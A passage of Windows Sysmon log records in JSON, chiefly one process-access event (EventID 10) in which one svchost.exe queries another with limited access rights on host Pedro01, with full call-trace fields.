  "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+6a685|c:\\windows\\system32\\lsm.dll+108a0|C:\\Windows\\System32\\RPCRT4.dll+76963|C:\\Windows\\System32\\RPCRT4.dll+da036|C:\\Windows\\System32\\RPCRT4.dll+37a5c|C:\\Windows\\System32\\RPCRT4.dll+548d8|C:\\Windows\\System32\\RPCRT4.dll+2c931|C:\\Windows\\System32\\RPCRT4.dll+2c1eb|C:\\Windows\\System32\\RPCRT4.dll+1a86f|C:\\Windows\\System32\\RPCRT4.dll+19d1a|C:\\Windows\\System32\\RPCRT4.dll+19301|C:\\Windows\\System32\\RPCRT4.dll+18d6e|C:\\Windows\\System32\\RPCRT4.dll+169a5|C:\\Windows\\SYSTEM32\\ntdll.dll+333fd|C:\\Windows\\SYSTEM32\\ntdll.dll+34152|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71",
  "SourceUser": "NT AUTHORITY\\SYSTEM",
  "TargetUser": "NT AUTHORITY\\LOCAL SERVICE"
}
{
  "SourceName": "Microsoft-Windows-Sysmon",
  "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
  "Level": "4",
  "Keywords": "0x8000000000000000",
  "Channel": "Microsoft-Windows-Sysmon/Operational",
  "Hostname": "Pedro01",
  "TimeCreated": "2022-08-04T08:36:15.184Z",
  "@timestamp": "2022-08-04T08:36:15.184Z",
  "EventID": 10,
  "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-08-04 15:36:15.091\r\nSourceProcessGUID: {625b42a0-6b35-62e9-1200-000000000900}\r\nSourceProcessId: 888\r\nSourceThreadId: 3696\r\nSourceImage: C:\\Windows\\system32\\svchost.exe\r\nTargetProcessGUID: {625b42a0-4111-62e9-4600-000000000900}\r\nTargetProcessId: 2696\r\nTargetImage: C:\\Windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+6a685|c:\\windows\\system32\\lsm.dll+106fe|C:\\Windows\\System32\\RPCRT4.dll+76963|C:\\Windows\\System32\\RPCRT4.dll+da036|C:\\Windows\\System32\\RPCRT4.dll+37a5c|C:\\Windows\\System32\\RPCRT4.dll+548d8|C:\\Windows\\System32\\RPCRT4.dll+2c931|C:\\Windows\\System32\\RPCRT4.dll+2c1eb|C:\\Windows\\System32\\RPCRT4.dll+1a86f|C:\\Windows\\System32\\RPCRT4.dll+19d1a|C:\\Windows\\System32\\RPCRT4.dll+19301|C:\\Windows\\System32\\RPCRT4.dll+18d6e|C:\\Windows\\System32\\RPCRT4.dll+169a5|C:\\Windows\\SYSTEM32\\ntdll.dll+333fd|C:\\Windows\\SYSTEM32\\ntdll.dll+34152|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\LOCAL SERVICE",
  "Task": "10",
  "RuleName": "-",
  "UtcTime": "2022-08-04 15:36:15.091",
  "SourceProcessGUID": "{625b42a0-6b35-62e9-1200-000000000900}",
  "SourceProcessId": "888",
  "SourceThreadId": "3696",
  "SourceImage": "C:\\Windows\\system32\\svchost.exe",
  "TargetProcessGUID": "{625b42a0-4111-62e9-4600-000000000900}",
  "TargetProcessId": "2696",
  "TargetImage": "C:\\Windows\\System32\\svchost.exe",
  "GrantedAccess": "0x1000",
  "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+6a685|c:\\windows\\system32\\lsm.dll+106fe|C:\\Windows\\System32\\RPCRT4.dll+76963|C:\\Windows\\System32\\RPCRT4.dll+da036|C:\\Windows\\System32\\RPCRT4.dll+37a5c|C:\\Windows\\System32\\RPCRT4.dll+548d8|C:\\Windows\\System32\\RPCRT4.dll+2c931|C:\\Windows\\System32\\RPCRT4.dll+2c1eb|C:\\Windows\\System32\\RPCRT4.dll+1a86f|C:\\Windows\\System32\\RPCRT4.dll+19d1a|C:\\Windows\\System32\\RPCRT4.dll+19301|C:\\Windows\\System32\\RPCRT4.dll+18d6e|C:\\Windows\\System32\\RPCRT4.dll+169a5|C:\\Windows\\SYSTEM32\\ntdll.dll+333fd|C:\\Windows\\SYSTEM32\\ntdll.dll+34152|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71",
  "SourceUser": "NT AUTHORITY\\SYSTEM",
  "TargetUser": "NT AUTHORITY\\LOCAL SERVICE"
}
```